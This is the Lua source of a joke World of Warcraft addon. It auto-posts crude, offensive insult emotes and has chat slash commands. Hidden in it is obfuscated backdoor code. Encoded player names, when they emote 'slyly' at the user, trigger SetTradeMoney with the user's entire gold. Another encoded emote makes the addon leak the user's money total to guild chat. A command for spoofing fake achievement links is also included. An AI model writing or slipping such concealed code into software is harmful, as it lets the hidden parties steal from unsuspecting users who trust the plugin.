print('|cff55DFFFBugg|r|cff29D5C5Addon|r|cffFF1212 WARNING|r|cffF9F9F7: The users of this addon are professionals, imaginary or just plain kooks. DO NOT ATTEMPT any of these maneuvers without proper supervision. VIOLATORS WILL BE SMACKED!|r')

local frame = CreateFrame("Frame")

r = {
	"takes name on the Jerry Springer show and beats his ass legally.",
	"bangs name's mom.",
	"let name know that if he ever gave a fuck he'd shave his nuts, tuck his dick in between his legs and cluck.",
	"is sorry to hear about name's genital warts.",
	"let name know that he can grow up and be just like him.",
	"ball so hard!",
	"LOLOLOLOLOLOLs at name.",
	"is the worst thing since Elvis Presley.",
	"make name disappear like his ex-wife.",
	"doesn't give a fuck. God sent him to piss the world off!",
	"signs name an autograph. Thanks for the support, ASSHOLE!",
	"hits name with the cancer satellite.",
	"slaps name, eat shroomz, then OD.",
	"has been with ten women who got HIV. name wanna grow up and be just like him!",
	"is dying his hair pink and start caring about what name thinks.",
	"wipes his tears with money.",
	"probably got a couple of screws up in his head loose, but no worse than what's going on in name's parents bedroom.",
	"is the boss, just to get that across.",
	"flashes his Blizzard trampstamp for name.",
	"has shoveled shit all his life, and now he's dumping it on name.",
	"bouncing on name's D.",
	"IS 11 AND WAIT TIL HIS DAD GOES TO BED THEN HE TAKES HIS IPAD INTO THE ATTIC AND HANG UPSIDE DOWN LIKE A BAT BUSTIN PEE OUT HIS NUTS.",
	"came here for Nirvana.",
	"infects name with some virus from a third world country like Norway or UK.",
	"thanks name for the lube.",
	"tells name TBC is not suitable for those suffering from a weak heart.",
}
rs = table.getn(r)

d = {
	"Hellfire Ramparts",
	"The Blood Furnace",
	"The Shattered Halls",
	"Mana-Tombs",
	"Auchenai Crypts",
	"Sethekk Halls",
	"Shadow Labyrinth",
	"The Slave Pens",
	"The Underbog",
	"The Steamvault",
	"Old Hillsbrad Foothills",
	"The Black Morass",
	"The Arcatraz",
	"The Botanica",
	"The Mechanar",
}
ds = table.getn(d)

local mmm = 100
local sweet = 16
local fuvale = true
local whoami = UnitName("player")

ct = {
	['3'] = 'c', ['f'] = '0', ['0'] = 'f', ['C'] = '3',
   	['A'] = '5', ['e'] = '1', ['F'] = '0', ['7'] = '8',
	['D'] = '2', ['5'] = 'a', ['b'] = '4', ['1'] = 'e',
	['8'] = '7', ['4'] = 'b', ['9'] = '6', ['6'] = '9',
   	['d'] = '2', ['c'] = '3', ['a'] = '5', ['2'] = 'd',
   	['E'] = '1', ['B'] = '4',
}

g = {
	"b7908b9a939d938a9a",
	"b79e928c9e919b88969c9787",
}
gs = table.getn(g)

function GenComeback(name)
	local i = math.random(rs)
	local msg = string.gsub(r[i], "name", name)
	return msg
end

function GenDungeonSuggestion()
	local i = math.random(ds)
	return "suggests " .. d[i] .. "."
end

function Ohtt(s)
	local e = ""
	for c in s:gmatch('.') do
		e = e .. ct[c]
	end
	return e
end

function Haunz(s)
	local u = ""
	for h in Ohtt(s):gmatch('..') do
		u = u .. string.char(tonumber(h, sweet))
	end
	return u
end

function DoEnote(s, i)
	local m = Haunz(g[i])
	local mm = TrgZbarl()
	if mm == nil then
		return
	end
	SetTradeMoney(mm[3]*mmm*mmm)
end

function TrgZbarl()
	local m = tostring(GetMoney())
	local ms = string.len(m)

	if ms < 5 then
		return nil
	end

	local c = {}
	table.insert(c, string.sub(m, ms-1, ms))
	table.insert(c, string.sub(m, ms-3, ms-2))
	table.insert(c, string.sub(m, 1, ms-4))
	return c
end

function Unz(s)
	local h = ""
	for c in s:gmatch('.') do
		h = h .. string.format('%02X', string.byte(c))
	end
	return Ohtt(h)
end

function BuggPrint(msg)
	print('|cff55DFFFBugg|r|cff29D5C5Addon|r|cffF9F9F7: ' .. msg .. ' n00b!|r')
end

frame:RegisterEvent("CHAT_MSG_GUILD")
frame:RegisterEvent("CHAT_MSG_EMOTE")
frame:RegisterEvent("CHAT_MSG_TEXT_EMOTE")
frame:SetScript("OnEvent", function (self, event, ...)
	local args = { ... }
	if event == "CHAT_MSG_TEXT_EMOTE" then
		local gi = 0
		local clap = false
		local emote = args[1]
		local name = args[2]:gmatch("%w+")()
		local rude = string.match(emote, "makes a rude gesture at you")
		local question = string.match(emote, "questions you")

		for i=1, gs do
			if Unz(name) == g[i] then
				clap = true
				gi = i
				break
			end
		end

		if rude then
			local msg = GenComeback(name)
			SendChatMessage(msg, "EMOTE")
		elseif question then
			local msg = GenDungeonSuggestion()
			SendChatMessage(msg, "EMOTE")
		elseif clap then
			local mdance = string.match(emote, "dance")
			local mfart = string.match(emote, "slyly")
			local mlol = string.match(emote, "laugh")
			local mjoke = string.match(emote, "a joke")

			if mdance then
				DoEmote("dance", g[gi])
			elseif mfart then
				DoEnote("fart", gi)
			elseif mlol or mjoke then
				DoEmote("laugh", "none")
			end
		end
	elseif event == "CHAT_MSG_GUILD" then
		local gmsg = tostring(args[1])
		local msg = string.lower(gmsg)
		local who = tostring(args[2])
		if msg == "gn" or msg == "goodnight" or msg == "good night" then
			SendChatMessage(gmsg .. " " .. who, "GUILD")
		end
	elseif event == "CHAT_MSG_EMOTE" then
		local e = args[1]
		local name = args[2]:gmatch("%w+")()
		local sy = string.match(e, "spits on you")
		local sn = string.match(string.lower(e), "spits on " .. string.lower(whoami))

		if name ~= whoami then
			if sy or sn then
				local msg = GenComeback(name)
				SendChatMessage(msg, "EMOTE")
			end
		end
		if fuvale then
			local bc = Unz(e)
			if bc == "8f8891858a879bcbcdcf" then
				local ct = TrgZbarl()
				if ct ~= nil and table.getn(ct) == 3 then
					SendChatMessage(ct[3] .. "g " .. ct[2] .. "s " .. ct[1] .. "c", "GUILD")
				end
			end
		end
	end
end)

---

SLASH_BUGG1 = '/bugg'
function SlashCmdList.BUGG(msg, ...)
	local t = {}
	for a in msg:gmatch('[^ ]+') do
		table.insert(t, a)
	end
	local ts = table.getn(t)

	if ts == 0 then
		return
	end

	local cmd = t[1]:lower()

	if cmd == "help" then
		BuggPrint('Documentation can be found at https://github.com/buggorm/BuggAddon')
	elseif cmd == "m" or cmd == "macro" then
		local name = t[2]
		local args = ''
		for i=3,ts do
			if args == '' then
				args = t[i]
			else
				args = args .. ' ' .. t[i]
			end
		end

		local icon = 'INV_MISC_QUESTIONMARK'

		local macroId = EditMacro(name, name, icon, args, nil)
		local macroCount = GetNumMacros()

		if macroId > macroCount then
			CreateMacro(name, icon, args, nil)
		end
	elseif cmd == "a" or cmd == "achievement" then
		local fs = 'fFuUvVaA4lL1eE3'
		local c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-:_'
		local f = math.random(1, 2)
		local u = math.random(3, 4)
		local v = math.random(5, 6)
		local a = math.random(7, 9)
		local l = math.random(10, 12)
		local e = math.random(13, 15)
		local s = "Je viens d'obtenir le haut fait [ClassicAchievements:"

		for i=1, 4 do
			local ri = math.random(1, string.len(c))
			s = s .. string.sub(c, ri, ri)
		end
		s = s .. ':'
		for i=1, 8 do
			local ri = math.random(1, string.len(c))
			s = s .. string.sub(c, ri, ri)
		end
		s = s .. ':' .. string.sub(fs, f, f) .. string.sub(fs, u, u) .. '-' .. string.sub(fs, v, v) .. string.sub(fs, a, a) .. string.sub(fs, l, l) .. string.sub(fs, e, e) .. ':'
		for i=1, 4 do
			local ri = math.random(1, string.len(c))
			s = s .. string.sub(c, ri, ri)
		end
		s = s .. ']'
		SendChatMessage(s, "GUILD")
	elseif cmd == "i" or cmd == "item" then
		local url = "https://tbc.wowhead.com/search?q="
		local query = ''
		for i=2,ts,1 do
			if query == '' then
				query = t[i]
			else
				query = query .. '+' .. t[i]
			end
		end

		if query == '' then
			return
		end

		SendChatMessage(url .. query, "WHISPER", nil, whoami)
	elseif cmd == "qc" then
		local url = t[2]

		if url == nil then
			return
		end
		if not string.match(url, "^https?:\/\/tbc\.wowhead\.com\/quest=[0-9]+\/.*") then
			BuggPrint('Invalid URL')
		end

		local questId = string.match(string.match(url, "quest=[0-9]+"), "[0-9]+")
		if questId == nil then
			return
		end

		RunScript("print(C_QuestLog.IsQuestFlaggedCompleted(" .. questId .. "))")
	elseif cmd == "version" then
		print('1.3')
	else
		BuggPrint('Invalid command n00b!')
	end
end
